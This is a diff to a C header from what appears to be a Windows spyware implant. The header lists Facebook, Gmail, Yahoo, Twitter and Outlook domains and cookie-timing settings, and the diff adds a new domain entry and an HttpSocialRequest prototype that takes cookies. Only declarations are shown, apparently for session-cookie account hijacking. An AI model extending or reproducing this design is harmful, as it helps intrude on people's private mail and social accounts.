@@ -3,20 +3,21 @@
 #include <Windows.h>
 #pragma pack(1)
 
-#define SOCIAL_ENTRY_COUNT 10
+#define SOCIAL_ENTRY_COUNT 11
 
 #define FACEBOOK_DOMAIN L"facebook.com" // FIXME array-izza!
 #define GMAIL_DOMAIN	L"mail.google.com"
 #define YAHOO_DOMAIN	L"yahoo.com"
 #define TWITTER_DOMAIN	L"twitter.com"
 #define OUTLOOK_DOMAIN	L"live.com"
+#define GD_DOMAIN		L"mail.google.com"
 
 #define FACEBOOK_DOMAINA	"facebook.com"
 #define GMAIL_DOMAINA		"mail.google.com"
 #define YAHOO_DOMAINA		"yahoo.com"
 #define TWITTER_DOMAINA		"twitter.com"
 #define OUTLOOK_DOMAINA		"live.com"
-
+#define GD_DOMAINA			"mail.google.com"
 
 #ifndef _DEBUG
 #define SLEEP_COOKIE 30 // In secondi
@@ -203,5 +204,18 @@ VOID SocialLogMailFull(
 	__in BOOL bDraft);
 
 VOID SocialDeleteTimeStamps();
+
+DWORD HttpSocialRequest(
+	__in  LPWSTR strHostName,
+	__in  LPWSTR strHttpVerb, 
+	__in  LPWSTR strHttpRsrc,	
+	__in  LPWSTR strHeader,
+	__in  DWORD  dwPort, 
+	__in  LPBYTE lpSendBuff, 
+	__in  DWORD  dwSendBuffSize, 
+	__out LPBYTE *lpRecvBuff, 
+	__out DWORD  *dwRespSize, 
+	__in  LPSTR  strCookies,
+	__in  DWORD  dwMaxSize=0);
 
 #endif _SOCIAL_H
